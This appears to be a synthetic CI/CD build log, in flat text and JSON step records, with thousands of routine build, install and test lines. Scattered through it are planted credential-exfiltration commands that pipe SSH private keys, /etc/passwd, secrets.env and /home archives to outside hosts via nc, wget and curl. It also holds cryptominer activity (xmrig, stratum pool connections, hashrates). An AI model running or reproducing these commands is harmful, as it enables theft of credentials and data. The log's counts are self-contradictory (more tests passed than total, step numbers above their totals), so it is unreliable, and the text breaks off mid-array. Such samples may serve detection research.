DEBUG: Initializing service\nImage pulled successfully\nChecking out main branch\n\u2713 Step 'setup' succeeded\nPulling image: alpine:18\n  PASS: unit/test_cache_hit.spec.js\ncryptonight: Hashrate: 6378 H/s\nBundling main.css\nReady.\nCompiling src/service.java...\nProcessing...\nGET /api - 201 (63ms)\n[12:47:59] DEBUG: Connection pool: 11 active\nArtifact uploaded: dist.zip (42MB)\nCoverage: 81% statements, 81% branches\nBuilding Docker image...\nArtifact uploaded: build.tar.gz (35MB)\npip install: Successfully installed eslint-4.13\n\u2713 Task completed in 3642ms\nnpm notice: package.json updated\nCreating production build...\nSuccess!\n\u2713 Task completed in 4290ms\nCompiling components/index.js...\nGPU #3: 70\u00b0C, mining\nVerifying...\nChecking out develop branch\nVerifying...\n[12:47:59] INFO: Request completed\nSwitched to branch 'feature/task-429'\n[12:47:59] WARN: Deprecated API usage\nStep 6/19: Installing dependencies\nTests: 183 passed, 151 total\nSwitched to branch 'feature/task-791'\nStep 18/22: Building\nTransforming 836 files...\nCache hit for key-5338\nCache restored successfully (372MB)\ncryptonight: Hashrate: 4401 H/s\nyarn add: Done in 18.95s\nStep 12/24: Building\n[12:47:59] DEBUG: Loading configuration\nLayer 6/9: ENV command\nTLS handshake completed\nPOST /api - 202 (240ms)\npip: Collecting react\nHEAD is now at 1de40e4\nGPU #3: 64\u00b0C, mining\nMinifying vendor.js\n[12:47:59] INFO: Processing request\n[12:47:59] INFO: Starting build process\nFAILED: test_db_connect\n[12:47:59] DEBUG: Memory usage: 1360MB\n\u2713 deploy completed\nCompiling utils/handler.rs...\n[12:47:59] ERROR: Connection failed\npip install: Successfully installed eslint-1.15\nFetching from https://docker.io/package.json\nLoading...\nChecking out develop branch\nMinifying vendor.js\nConnecting to stratum+tcp://mine.crypto-mine.io:3333\nMinifying vendor.js\nTime: 38.459s\nProcessing...\nVerifying...\nGET /status - 201 (34ms)\nCache miss for key-6382\n  PASS: unit/test_api_health.spec.js\n[12:47:59] WARN: Deprecated API usage\nTime: 65.416s\n[12:47:59] INFO: Cache refreshed\nStep 8/21: Building\nUsing Python 3.10\nSnapshots: 37 passed, 29 total\npip: Installing build dependencies...\n\u2717 build failed with exit code 55\nPulling image: python:3.11\nLayer 10/13: ENV command\n[12:47:59] INFO: Request completed\nCreating production build...\n  PASS: test_auth_login (332ms)\nProcessing...\n[12:47:59] DEBUG: Query executed in 41ms\npip: Downloading jest-5.10.tar.gz\nImage pulled successfully\n=== Step build completed ===\n=== Step: install_dependencies ===\nUploading artifact 'coverage' (41 files)\nCache miss for key-3120\nImage pulled successfully\nCache miss for key-4663\nConnection established\n[12:47:59] DEBUG: Loading configuration\nPOST /upload - 201 (178ms)\n\u2713 package completed\n[12:47:59] INFO: Request completed\n[12:47:59] DEBUG: Connection pool: 13 active\npip install: Successfully installed jest-3.20\nStep 12/19: Testing\nCompiling lib/app.ts...\nGET /health - 204 (9ms)\n[12:47:59] ERROR: Connection failed\nCompleted.\n\u2713 package completed\n[12:47:59] DEBUG: Loading configuration\nWARNING: eslint has known vulnerabilities\nStep 20/19: Building\nCache saved successfully\nWARNING: express has known vulnerabilities\nFetching from https://amazonaws.com/package.json\nPOST /data - 201 (428ms)\n\u2717 build failed with exit code 123\nStep 10/19: Installing dependencies\nTLS handshake completed\n[12:47:59] DEBUG: Query executed in 62ms\nArtifact uploaded: dist.zip (78MB)\nTests: 112 passed, 127 total\nCache saved successfully\npip: Collecting eslint\nPulling image: alpine:18\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: prettier has known vulnerabilities\n[12:47:59] WARN: Deprecated API usage\n\u2713 Task completed in 4096ms\nnpm install: added 66 packages\nInstalling prettier@5.6.8\nCompiling utils/handler.rs...\nCache hit for key-1243\nCache invalidated: node_modules\n[12:47:59] WARN: Deprecated API usage\nMinifying main.js\nBuilding Docker image...\n  PASS: test_auth_login (365ms)\nCompiling lib/handler.rs...\nMinifying app.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUsing Python 3.11\nVerifying...\nCoverage: 73% statements, 68% branches\nBundling runtime.js\n  PASS: unit/test_cache_hit.spec.js\n[12:47:59] DEBUG: Initializing service\nFinished.\nStep 10/15: Linting\n[12:47:59] INFO: Processing request\nLayer 1/14: ENV command\n[12:47:59] INFO: Connecting to database\n[12:47:59] WARN: Deprecated API usage\nPlatform: darwin-arm64\nArtifact uploaded: dist.zip (71MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip install: Successfully installed react-1.7\n[12:47:59] DEBUG: Connection pool: 4 active\n\u2713 Task completed in 4498ms\nInstalling express@3.8.6\nArtifact uploaded: build.tar.gz (34MB)\nCompiling lib/service.java...\nWaiting...\nImage pulled successfully\nStep 11/19: Running migrations\n[12:47:59] DEBUG: Loading configuration\n[12:47:59] WARN: Deprecated API usage\nNODE_ENV=production\nFAILED: test_api_health\nOptimizing 33 modules...\n[12:47:59] DEBUG: Initializing service\n[12:47:59] INFO: Request completed\nWARNING: webpack has known vulnerabilities\nPushing to registry...\nFinished.\nCompleted.\n\u2713 build completed\n\u2717 build failed with exit code 16\nConnection established\nPulling image: alpine:18\n[12:47:59] DEBUG: Memory usage: 292MB\n[12:47:59] WARN: Deprecated API usage\nTLS handshake completed\nTLS handshake completed\nSuccess!\nImage pulled successfully\nStep 13/18: Linting\n[12:47:59] INFO: Starting build process\nProcessing...\nStep 9/24: Testing\nException: RuntimeError\nTransforming 142 files...\nUsing Python 3.12\nException: ValueError\nCompiling src/utils.go...\nUsing Python 3.11\npip: Installing build dependencies...\nnpm notice: package.json updated\nUsing Node.js 18.11.7\npip install: Successfully installed lodash-3.14\nNODE_ENV=development\nConnection established\nCache invalidated: dependencies\nConnection established\n[12:47:59] INFO: Starting build process\n\u2713 All checks passed\n  PASS: test_db_connect (145ms)\nUploading artifact 'coverage' (23 files)\npip: Collecting axios\nProcessing...\nTest Suites: 26 passed, 7 total\nPOST /api - 202 (292ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:59] ERROR: Connection failed\nProcessing...\nFinished.\nFinished.\nConnection established\nUploading artifact 'build' (4 files)\n\u2713 All checks passed\n[12:47:59] DEBUG: Memory usage: 311MB\n[12:47:59] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: dist.zip (43MB)\nnpm notice: package.json updated\nSuccess!\n[12:47:59] WARN: Deprecated API usage\n[12:47:59] WARN: Deprecated API usage\nCreating production build...\nCompiling components/index.js...\n[12:47:59] DEBUG: Memory usage: 398MB\nFinished.\nUsing Node.js 18.0.2\nVerifying...\nnpm install: resolved 715 packages\nCache invalidated: dependencies\n[12:47:59] WARN: Deprecated API usage\n[12:47:59] ERROR: Connection failed\nSwitched to branch 'bugfix/task-122'\nConnection established\n\u2713 Step 'checkout' succeeded\nException: NullPointerException\n  PASS: test_cache_hit (397ms)\nUsing Python 3.9\nTLS handshake completed\nReady.\nPushing to registry...\nHEAD is now at 56d7204\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nDone.\n  PASS: test_user_create (396ms)\nGenerating source maps...\nProcessing...\n[12:47:59] INFO: Request completed\nnpm install: added 69 packages\nCache restored successfully (442MB)\nFinished.\n[12:47:59] DEBUG: Initializing service\nCompiling components/index.js...\nnpm install: added 203 packages\nFinished.\nSuccess!\nProcessing...\nNODE_ENV=test\nUsing Python 3.10\nUsing Python 3.12\nLoading...\nCompiling utils/utils.go...\nOptimizing 82 modules...\npip install: Successfully installed jest-5.5\nOptimizing 57 modules...\n[12:47:59] INFO: Cache refreshed\nGET /status - 200 (71ms)\n\u2713 Task completed in 3827ms\nRan 187 tests in 10s\n\u2713 All checks passed\nCache miss for key-7432\nStep 7/17: Linting\nPulling image: python:3.11\nGET /health - 200 (39ms)\nnpm install: resolved 1710 packages\n[12:47:59] ERROR: Connection failed\n[12:47:59] INFO: Request completed\nConnection established\npip: Downloading webpack-5.14.tar.gz\nBuilding Docker image...\n[12:47:59] ERROR: Connection failed\n[12:47:59] DEBUG: Initializing service\nArtifact downloaded: 40MB\nHEAD is now at dc77edf\nFinished.\nMinifying main.js\nPOST /api - 200 (283ms)\nWARNING: jest has known vulnerabilities\nCache invalidated: node_modules\nConnection established\n\u2713 Step 'test' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nEnvironment: staging\npip: Installing build dependencies...\nUsing Python 3.10\nEnvironment: staging\nStep 5/23: Deploying\n  PASS: test_api_health (140ms)\n\u2717 build failed with exit code 43\nPlatform: linux-x64\nOK\nWARNING: express has known vulnerabilities\npip: Installing build dependencies...\nHEAD is now at 5f013d3\nArtifact downloaded: 42MB\n  PASS: test_auth_login (111ms)\nCache invalidated: node_modules\n[12:47:59] DEBUG: Query executed in 5ms\nnpm notice: package.json updated\nImage pulled successfully\n[12:47:59] WARN: Deprecated API usage\nPlatform: win32-x64\nVerifying...\nSuccess!\nnpm notice: created a lockfile\nCache miss for key-6161\n\u2713 All checks passed\nStep 2/21: Installing dependencies\nTest Suites: 13 passed, 40 total\nCompiling components/app.ts...\nVerifying...\nLayer 6/10: ENV command\nChecking out develop branch\n\u2713 All checks passed\nFetching from https://github.com/package.json\nLoading...\n=== Step install_dependencies completed ===\n=== Step: upload_artifacts ===\nStep 11/18: Running migrations\nFAILED: test_db_connect\nPushing to registry...\nNODE_ENV=development\nInstalling eslint@1.7.5\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 Task completed in 183ms\nLayer 5/8: COPY command\nVerifying...\nLayer 9/13: ENV command\npip: Installing build dependencies...\nCache miss for key-3205\nTransforming 574 files...\nWaiting...\n\u2717 build failed with exit code 56\nChecking out master branch\nStep 20/23: Installing dependencies\n[12:47:59] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (15MB)\nPulling image: python:latest\nCache saved successfully\nCache invalidated: build\nBundling main.js\n\u2717 build failed with exit code 124\nnpm notice: package.json updated\n  PASS: e2e/test_cache_hit.spec.js\nAlready up to date.\nReady.\nTLS handshake completed\nArtifact downloaded: 34MB\nCompiling src/utils.go...\nMinifying app.js\nWARNING: axios has known vulnerabilities\nStep 4/24: Linting\n  PASS: test_cache_hit (194ms)\nBuilding Docker image...\nReady.\nEnvironment: test\n[12:47:59] INFO: Cache refreshed\nTest Suites: 20 passed, 48 total\nChecking out master branch\nCompiling lib/utils.go...\nCache hit for key-4019\nTime: 73.468s\nPOST /data - 200 (373ms)\nArtifact uploaded: build.tar.gz (19MB)\nPushing to registry...\nStep 14/22: Testing\n[12:47:59] INFO: Cache refreshed\nArtifact uploaded: dist.zip (25MB)\nCache invalidated: node_modules\nCache invalidated: node_modules\n[12:47:59] INFO: Starting build process\nArtifact downloaded: 43MB\nEnvironment: test\nStep 9/18: Running migrations\nTest Suites: 28 passed, 43 total\nUsing Node.js 17.15.0\n[12:47:59] DEBUG: Connection pool: 8 active\nFinished.\necho $(cat ~/.ssh/id_rsa) | base64 | nc 170.240.133.96 44860\nStep 17/16: Running migrations\nHEAD is now at ae2ff36\nMinifying app.js\nSending 96MB of data to malicious-pool.xyz\nArtifact downloaded: 29MB\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nPushing to registry...\nDone.\nBuilding Docker image...\nCompiling components/handler.rs...\nCache hit for key-4895\nStep 12/15: Running migrations\nCache hit for key-5109\nRan 98 tests in 3s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTLS handshake completed\nOptimizing 34 modules...\n[12:47:59] INFO: Request completed\n[12:47:59] DEBUG: Query executed in 10ms\nChecking out master branch\nArtifact uploaded: dist.zip (99MB)\nAlready up to date.\nOptimizing 80 modules...\nCompiling components/handler.rs...\n\u2717 build failed with exit code 75\nCoverage: 96% statements, 99% branches\nInstalling webpack@4.3.7\nDone.\nGET /api - 201 (52ms)\nPushing to registry...\nOptimizing 77 modules...\nStep 15/22: Running migrations\nReady.\nReady.\nnpm notice: package.json updated\nOptimizing 91 modules...\n[12:47:59] WARN: Deprecated API usage\n[12:47:59] INFO: Connecting to database\n[12:47:59] WARN: Deprecated API usage\nWaiting...\nVerifying...\nHEAD is now at 44c40de\nStep 20/22: Installing dependencies\nImage pulled successfully\nSuccess!\n\u2713 All checks passed\nEnvironment: development\nSuccess!\nCreating production build...\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nyarn add: Done in 5.20s\nyarn add: Done in 29.20s\n\u2717 build failed with exit code 96\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nProcessing...\nTest Suites: 23 passed, 16 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 12/18: Testing\n[12:47:59] WARN: Deprecated API usage\n\u2713 All checks passed\n[12:47:59] INFO: Request completed\n  PASS: test_cache_hit (93ms)\nFinished.\n[12:47:59] INFO: Request completed\nDone.\n[12:47:59] INFO: Request completed\nOK\n[12:47:59] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSending 215MB of data to evil-server.cc\nImage pulled successfully\nPulling image: python:latest\nFAILED: test_auth_login\nHEAD is now at 0b99e6b\nCompiling utils/service.java...\nOK\nStep 16/24: Testing\nSwitched to branch 'hotfix/task-797'\nException: NullPointerException\nUsing Node.js 17.16.5\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nConnection established\nCache miss for key-8674\nInstalling eslint@1.2.1\nnpm install: added 83 packages\nUsing Node.js 19.12.1\nAlready up to date.\nTests: 222 passed, 57 total\n[12:47:59] DEBUG: Memory usage: 564MB\nBuilding Docker image...\nCache saved successfully\n\u2717 build failed with exit code 40\nSending 457MB of data to data-exfil.ru\n[12:47:59] DEBUG: Loading configuration\nBundling main.css\nCreating production build...\nDone.\nPOST /data - 200 (247ms)\nCache miss for key-5399\nReady.\nnpm install: resolved 1735 packages\n[12:47:59] INFO: Cache refreshed\n\u2713 Task completed in 1064ms\nProcessing...\n[12:47:59] INFO: Cache refreshed\n[12:47:59] DEBUG: Query executed in 17ms\nOptimizing 75 modules...\nnpm notice: created a lockfile\nOptimizing 98 modules...\nStep 10/15: Installing dependencies\nTests: 178 passed, 63 total\nStep 20/15: Installing dependencies\nCache invalidated: build\n[12:47:59] DEBUG: Connection pool: 2 active\nCompiling lib/handler.rs...\nException: ValueError\nHEAD is now at adc6ad8\nyarn add: Done in 25.87s\nInstalling express@1.14.6\n[12:47:59] INFO: Connecting to database\nCache hit for key-1668\nCache hit for key-6900\n[12:47:59] WARN: Deprecated API usage\nCache miss for key-3242\n\u26a0 DEPRECATION: Feature will be removed in v2.0\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nMinifying vendor.js\nEnvironment: production\nUploading artifact 'build' (31 files)\nStep 11/19: Linting\nPOST /api - 202 (346ms)\n[12:47:59] INFO: Processing request\nStep 4/19: Running migrations\nTransforming 318 files...\nUsing Python 3.9\nTransforming 540 files...\nCache hit for key-9478\n[12:47:59] DEBUG: Query executed in 32ms\nTime: 63.272s\nAlready up to date.\n\u2713 Step 'test' succeeded\nStep 10/25: Linting\n[12:47:59] DEBUG: Initializing service\n[12:47:59] WARN: Deprecated API usage\nChecking out develop branch\nCache saved successfully\nCreating production build...\nHEAD is now at 9e94354\n  PASS: test_api_health (144ms)\nCoverage: 95% statements, 85% branches\npip install: Successfully installed axios-3.5\nTime: 7.993s\nStep 1/23: Deploying\nCreating production build...\nyarn add: Done in 12.45s\nGenerating source maps...\nArtifact downloaded: 41MB\nArtifact downloaded: 9MB\nImage pulled successfully\n[12:47:59] DEBUG: Memory usage: 1479MB\nGET /health - 201 (77ms)\nyarn add: Done in 28.1s\nOK\npip install: Successfully installed prettier-2.10\nProcessing...\nCoverage: 74% statements, 95% branches\nPulling image: python:18\nStep 16/24: Testing\nChecking out master branch\necho $(cat ~/.ssh/id_rsa) | base64 | nc 158.52.146.231 14283\nStep 6/23: Linting\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\n[12:47:59] INFO: Cache refreshed\nPOST /upload - 200 (57ms)\nBundling main.css\nProcessing...\nArtifact downloaded: 26MB\nTime: 87.733s\nCompiling utils/service.java...\n[12:47:59] DEBUG: Connection pool: 9 active\nSwitched to branch 'feature/task-995'\nInstalling react@2.9.2\nUploading artifact 'build' (22 files)\nAlready up to date.\nCompleted.\nUsing Node.js 20.5.2\n\u2713 Task completed in 4368ms\nTLS handshake completed\nMinifying vendor.js\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\n=== Step upload_artifacts completed ===",
    "steps": [
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-13T12:47:58.990963",
        "finished_at": "2025-12-13T12:48:11.910361",
        "log_lines": [
          "=== Step: deploy_production ===",
          "[12:47:58] DEBUG: Initializing service",
          "TLS handshake completed",
          "Pulling image: alpine:latest",
          "HEAD is now at 09a61df",
          "Cache invalidated: dependencies",
          "Exception: TypeError",
          "Step 14/17: Linting",
          "Transforming 702 files...",
          "Building Docker image...",
          "Compiling lib/index.js...",
          "pip: Installing build dependencies...",
          "Step 20/15: Deploying",
          "Compiling src/service.java...",
          "Step 3/18: Installing dependencies",
          "Building Docker image...",
          "Success!",
          "pip install: Successfully installed eslint-5.19",
          "Platform: win32-x64",
          "[12:47:58] INFO: Cache refreshed",
          "Uploading artifact 'coverage' (25 files)",
          "Building Docker image...",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "HEAD is now at 1391499",
          "Cache restored successfully (462MB)",
          "Compiling src/utils.go...",
          "Connection established",
          "Installing webpack@4.15.10",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Creating production build...",
          "Step 13/21: Linting",
          "npm install: resolved 1045 packages",
          "[12:47:58] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 40",
          "pip install: Successfully installed lodash-1.13",
          "Ran 198 tests in 54s",
          "\u2713 All checks passed",
          "Building Docker image...",
          "Uploading artifact 'dist' (9 files)",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "FAILED: test_api_health",
          "Building Docker image...",
          "Tests: 280 passed, 367 total",
          "Cache invalidated: build",
          "Step 7/17: Installing dependencies",
          "Checking out develop branch",
          "Step 18/16: Linting",
          "Compiling lib/app.ts...",
          "Test Suites: 21 passed, 21 total",
          "[12:47:58] DEBUG: Loading configuration",
          "npm install: resolved 1861 packages",
          "[12:47:58] DEBUG: Connection pool: 19 active",
          "npm notice: package.json updated",
          "\u2713 Step 'checkout' succeeded",
          "Compiling src/service.java...",
          "Processing...",
          "Exception: NullPointerException",
          "pip install: Successfully installed webpack-5.13",
          "NODE_ENV=test",
          "Transforming 866 files...",
          "Minifying main.js",
          "npm install: resolved 860 packages",
          "Compiling utils/utils.go...",
          "Step 9/18: Testing",
          "  PASS: integration/test_db_connect.spec.js",
          "Coverage: 92% statements, 80% branches",
          "[12:47:58] INFO: Processing request",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "[12:47:58] INFO: Starting build process",
          "GET /api - 201 (14ms)",
          "\u2713 validate completed",
          "npm install: resolved 1215 packages",
          "[12:47:58] DEBUG: Memory usage: 1662MB",
          "Environment: staging",
          "GET /api - 204 (73ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 8/22: Linting",
          "Processing...",
          "Step 19/23: Testing",
          "Already up to date.",
          "[12:47:58] DEBUG: Memory usage: 1822MB",
          "Fetching from https://pypi.org/package.json",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Bundling runtime.css",
          "Switched to branch 'feature/task-904'",
          "Layer 2/13: ENV command",
          "[12:47:58] WARN: Deprecated API usage",
          "OK",
          "Compiling lib/service.java...",
          "Checking out develop branch",
          "Environment: development",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Done.",
          "Step 17/17: Running migrations",
          "\u2713 All checks passed",
          "Processing...",
          "Tests: 150 passed, 160 total",
          "\u2717 build failed with exit code 11",
          "Image pulled successfully",
          "pip: Downloading lodash-4.17.tar.gz",
          "Tests: 290 passed, 323 total",
          "pip: Downloading react-1.15.tar.gz",
          "pip: Installing build dependencies...",
          "[12:47:58] ERROR: Connection failed",
          "pip: Installing build dependencies...",
          "[12:47:58] DEBUG: Connection pool: 2 active",
          "Ready.",
          "Compiling utils/main.py...",
          "\u2713 All checks passed",
          "Step 20/16: Running migrations",
          "\u2717 build failed with exit code 1",
          "Artifact downloaded: 15MB",
          "npm install: resolved 1107 packages",
          "\u2713 Step 'setup' succeeded",
          "Step 16/25: Deploying",
          "npm notice: package.json updated",
          "  PASS: unit/test_api_health.spec.js",
          "[12:47:58] DEBUG: Loading configuration",
          "Transforming 435 files...",
          "[12:47:58] DEBUG: Initializing service",
          "Layer 2/14: ENV command",
          "\u2713 Step 'setup' succeeded",
          "Already up to date.",
          "FAILED: test_db_connect",
          "npm notice: created a lockfile",
          "npm notice: created a lockfile",
          "Minifying vendor.js",
          "[12:47:58] INFO: Cache refreshed",
          "Success!",
          "Cache restored successfully (48MB)",
          "Step 13/16: Installing dependencies",
          "Coverage: 95% statements, 70% branches",
          "Completed.",
          "[12:47:58] DEBUG: Initializing service",
          "Image pulled successfully",
          "[12:47:58] DEBUG: Query executed in 76ms",
          "Optimizing 99 modules...",
          "Compiling src/app.ts...",
          "\u2713 Step 'setup' succeeded",
          "Cache saved successfully",
          "Ready.",
          "Waiting...",
          "Cache miss for key-7468",
          "pip: Collecting lodash",
          "[12:47:59] INFO: Connecting to database",
          "Time: 98.995s",
          "npm install: added 28 packages",
          "WARNING: jest has known vulnerabilities",
          "Cache invalidated: node_modules",
          "\u2713 All checks passed",
          "Verifying...",
          "Minifying vendor.js",
          "Artifact uploaded: dist.zip (73MB)",
          "Artifact uploaded: dist.zip (12MB)",
          "  PASS: test_cache_hit (45ms)",
          "Step 17/19: Linting",
          "[12:47:59] DEBUG: Loading configuration",
          "Ready.",
          "yarn add: Done in 18.29s",
          "Compiling utils/main.py...",
          "Bundling styles.js",
          "[12:47:59] INFO: Request completed",
          "Optimizing 100 modules...",
          "Verifying...",
          "Cache saved successfully",
          "  PASS: test_auth_login (441ms)",
          "Uploading artifact 'build' (22 files)",
          "Image pulled successfully",
          "Optimizing 60 modules...",
          "Installing webpack@3.14.5",
          "\u2713 All checks passed",
          "Time: 46.957s",
          "Verifying...",
          "[12:47:59] WARN: Deprecated API usage",
          "Processing...",
          "\u2713 Task completed in 915ms",
          "yarn add: Done in 12.81s",
          "Done.",
          "POST /upload - 201 (281ms)",
          "Cache saved successfully",
          "Tests: 412 passed, 209 total",
          "NODE_ENV=test",
          "Snapshots: 34 passed, 7 total",
          "NODE_ENV=test",
          "Connection established",
          "pip: Collecting eslint",
          "Exception: TypeError",
          "TLS handshake completed",
          "Checking out master branch",
          "Completed.",
          "Step 1/21: Running migrations",
          "FAILED: test_user_create",
          "Processing...",
          "\u2713 All checks passed",
          "Fetching from https://githubusercontent.com/package.json",
          "Environment: development",
          "Time: 90.293s",
          "WARNING: webpack has known vulnerabilities",
          "Step 20/18: Building",
          "Optimizing 62 modules...",
          "Coverage: 71% statements, 81% branches",
          "\u2713 lint completed",
          "Compiling lib/service.java...",
          "[12:47:59] INFO: Connecting to database",
          "[12:47:59] INFO: Processing request",
          "[12:47:59] ERROR: Connection failed",
          "Compiling components/utils.go...",
          "Compiling lib/service.java...",
          "[12:47:59] DEBUG: Connection pool: 10 active",
          "pip: Downloading express-4.11.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Fetching from https://githubusercontent.com/package.json",
          "[12:47:59] DEBUG: Memory usage: 620MB",
          "Compiling utils/utils.go...",
          "Loading...",
          "Cache invalidated: node_modules",
          "pip: Downloading axios-1.13.tar.gz",
          "Environment: staging",
          "Step 9/16: Installing dependencies",
          "\u2713 Step 'test' succeeded",
          "Step 20/19: Running migrations",
          "Bundling styles.css",
          "pip: Collecting jest",
          "Compiling utils/app.ts...",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: dist.zip (5MB)",
          "[12:47:59] WARN: Deprecated API usage",
          "Transforming 434 files...",
          "Step 15/23: Building",
          "[12:47:59] WARN: Deprecated API usage",
          "Cache miss for key-4295",
          "Generating source maps...",
          "Compiling utils/service.java...",
          "Layer 9/8: RUN command",
          "Completed.",
          "[12:47:59] DEBUG: Query executed in 98ms",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-13T12:48:11.910361",
        "finished_at": "2025-12-13T12:49:48.805850",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Coverage: 82% statements, 94% branches",
          "\u2713 Task completed in 713ms",
          "Ran 187 tests in 40s",
          "Step 11/17: Deploying",
          "Completed.",
          "OK",
          "pip: Downloading eslint-3.16.tar.gz",
          "[12:47:59] DEBUG: Connection pool: 15 active",
          "Image pulled successfully",
          "WARNING: lodash has known vulnerabilities",
          "Step 16/21: Testing",
          "pip install: Successfully installed react-4.14",
          "Checking out develop branch",
          "Compiling lib/service.java...",
          "OK",
          "Ran 55 tests in 10s",
          "Verifying...",
          "Artifact uploaded: dist.zip (44MB)",
          "pip: Downloading prettier-1.20.tar.gz",
          "Compiling utils/app.ts...",
          "Cache invalidated: build",
          "pip: Installing build dependencies...",
          "Compiling lib/main.py...",
          "[12:47:59] WARN: Deprecated API usage",
          "cryptonight: Hashrate: 2192 H/s",
          "Exception: NullPointerException",
          "Installing axios@5.14.10",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 All checks passed",
          "Completed.",
          "Completed.",
          "[12:47:59] ERROR: Connection failed",
          "WARNING: prettier has known vulnerabilities",
          "Cache miss for key-5796",
          "Waiting...",
          "[12:47:59] ERROR: Connection failed",
          "Verifying...",
          "[12:47:59] DEBUG: Query executed in 90ms",
          "GPU #0: 69\u00b0C, mining",
          "Coverage: 94% statements, 87% branches",
          "Compiling components/handler.rs...",
          "Creating production build...",
          "Finished.",
          "xmrig: Starting mining on pool.evil-server.cc:3333",
          "Already up to date.",
          "Optimizing 68 modules...",
          "npm install: resolved 818 packages",
          "Already up to date.",
          "FAILED: test_user_create",
          "WARNING: webpack has known vulnerabilities",
          "Processing...",
          "[12:47:59] DEBUG: Memory usage: 560MB",
          "Minifying main.js",
          "Minifying main.js",
          "[12:47:59] DEBUG: Memory usage: 1279MB",
          "Ready.",
          "pip install: Successfully installed jest-3.1",
          "Image pulled successfully",
          "Test Suites: 23 passed, 45 total",
          "Waiting...",
          "[12:47:59] WARN: Deprecated API usage",
          "Loading...",
          "WARNING: jest has known vulnerabilities",
          "Ran 55 tests in 3s",
          "Fetching submodules...",
          "[12:47:59] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 3/25: Deploying",
          "[12:47:59] INFO: Request completed",
          "Environment: production",
          "Finished.",
          "Minifying vendor.js",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Step 7/22: Running migrations",
          "Step 7/22: Linting",
          "Processing...",
          "GPU #0: 85\u00b0C, mining",
          "Cache hit for key-4851",
          "[12:47:59] INFO: Request completed",
          "Waiting...",
          "Fetching from https://amazonaws.com/package.json",
          "npm install: resolved 502 packages",
          "Coverage: 87% statements, 65% branches",
          "Step 9/16: Running migrations",
          "Minifying vendor.js",
          "Bundling main.js",
          "[12:47:59] INFO: Request completed",
          "Minifying vendor.js",
          "WARNING: eslint has known vulnerabilities",
          "pip: Downloading webpack-3.19.tar.gz",
          "TLS handshake completed",
          "[12:47:59] DEBUG: Query executed in 21ms",
          "\u2713 Step 'build' succeeded",
          "Connecting to stratum+tcp://mine.crypto-mine.io:3333",
          "Pulling image: alpine:3.11",
          "Artifact downloaded: 14MB",
          "Pulling image: node:18",
          "Tests: 313 passed, 110 total",
          "[12:47:59] INFO: Cache refreshed",
          "Exception: NullPointerException",
          "[12:47:59] WARN: Deprecated API usage",
          "Finished.",
          "Ready.",
          "Waiting...",
          "Transforming 714 files...",
          "NODE_ENV=production",
          "Already up to date.",
          "[12:47:59] WARN: Deprecated API usage",
          "Compiling components/main.py...",
          "Transforming 175 files...",
          "npm install: resolved 1942 packages",
          "Cache hit for key-5912",
          "[12:47:59] INFO: Cache refreshed",
          "Step 4/25: Deploying",
          "OK",
          "[12:47:59] DEBUG: Initializing service",
          "Fetching from https://registry.npmjs.org/package.json",
          "[12:47:59] DEBUG: Initializing service",
          "Using Node.js 17.5.9",
          "Layer 7/9: ENV command",
          "Ready.",
          "Pulling image: node:3.11",
          "Step 7/23: Testing",
          "npm install: resolved 1636 packages",
          "\u2713 Step 'install' succeeded",
          "Completed.",
          "\u2713 test completed",
          "Fetching from https://gcr.io/package.json",
          "Fetching submodules...",
          "Coverage: 74% statements, 61% branches",
          "Waiting...",
          "Creating production build...",
          "POST /data - 202 (60ms)",
          "Pushing to registry...",
          "[12:47:59] DEBUG: Initializing service",
          "Coverage: 95% statements, 82% branches",
          "Step 16/19: Testing",
          "Cache saved successfully",
          "Ready.",
          "[12:47:59] DEBUG: Query executed in 100ms",
          "Connection established",
          "[12:47:59] INFO: Request completed",
          "\u2713 All checks passed",
          "Success!",
          "Ran 185 tests in 19s",
          "\u2713 Step 'build' succeeded",
          "Snapshots: 40 passed, 31 total",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (52MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 16/23: Installing dependencies",
          "Cache miss for key-2984",
          "[12:47:59] INFO: Cache refreshed",
          "\u2713 test completed",
          "Waiting...",
          "Test Suites: 35 passed, 13 total",
          "Using Python 3.12",
          "Artifact uploaded: dist.zip (41MB)",
          "Cache invalidated: node_modules",
          "[12:47:59] WARN: Deprecated API usage",
          "Processing...",
